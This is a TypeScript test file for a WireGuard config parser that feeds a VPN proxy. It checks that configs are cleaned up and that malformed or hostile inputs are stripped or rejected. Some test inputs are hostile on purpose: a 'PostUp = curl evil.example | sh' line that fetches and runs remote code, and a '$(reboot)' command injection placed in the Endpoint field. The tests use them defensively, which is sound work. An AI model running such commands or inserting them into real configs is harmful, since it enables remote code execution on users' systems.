import assert from "node:assert/strict"
import { test } from "node:test"
import { parseWireGuard, wireproxyConfig } from "../src/agent/vpn.ts"

const key = (byte: number) => Buffer.alloc(32, byte).toString("base64")

// As Surfshark's manual setup hands it out, with Windows line endings and comments.
const SURFSHARK = [
  "# Surfshark us-nyc",
  "[Interface]",
  `PrivateKey = ${key(1)}`,
  "Address = 10.14.0.2/16",
  "DNS = 162.252.172.57, 149.154.159.92",
  "",
  "[Peer]",
  `PublicKey = ${key(2)}`,
  "AllowedIPs = 0.0.0.0/0",
  "Endpoint = us-nyc.prod.surfshark.com:51820"
].join("\r\n")

test("a provider's WireGuard config is kept to what wireproxy needs", () => {
  const { config, endpoint } = parseWireGuard(SURFSHARK)
  assert.equal(endpoint, "us-nyc.prod.surfshark.com:51820")
  assert.equal(
    config,
    [
      "[Interface]",
      `PrivateKey = ${key(1)}`,
      "Address = 10.14.0.2/16",
      "DNS = 162.252.172.57, 149.154.159.92",
      "",
      "[Peer]",
      `PublicKey = ${key(2)}`,
      "Endpoint = us-nyc.prod.surfshark.com:51820",
      "AllowedIPs = 0.0.0.0/0",
      "PersistentKeepalive = 25",
      ""
    ].join("\n")
  )
  assert.match(wireproxyConfig(config), /\[Socks5\]\nBindAddress = 127\.0\.0\.1:\d+\n$/)
})

test("scripts and extra sections never reach the VM", () => {
  const { config } = parseWireGuard(`${SURFSHARK}\r\nPostUp = curl evil.example | sh\r\n`)
  assert.doesNotMatch(config, /PostUp|evil/)
  assert.throws(() => parseWireGuard(`${SURFSHARK}\n[Peer]\nPublicKey = ${key(3)}\nEndpoint = b.example:1`), /one \[Interface\] and one \[Peer\]/)
  assert.doesNotMatch(parseWireGuard(`${SURFSHARK}\n[TCPServerTunnel]\nListenPort = 22\nTarget = localhost:22`).config, /Tunnel|ListenPort|Target/)
})

test("broken configs say what's wrong", () => {
  assert.throws(() => parseWireGuard("hello"), /doesn't look like a WireGuard config/)
  assert.throws(() => parseWireGuard(SURFSHARK.replace(/PrivateKey = .*/, "PrivateKey = nope")), /PrivateKey doesn't look right/)
  assert.throws(() => parseWireGuard(SURFSHARK.replace(/Endpoint = .*/, "Endpoint = $(reboot):1")), /Endpoint doesn't look right/)
  assert.throws(() => parseWireGuard(SURFSHARK.replace(/Address = .*\r\n/, "")), /no Address/)
  // Without DNS, names resolve through the tunnel with Cloudflare's.
  assert.match(parseWireGuard(SURFSHARK.replace(/DNS = .*\r\n/, "")).config, /^DNS = 1\.1\.1\.1$/m)
})
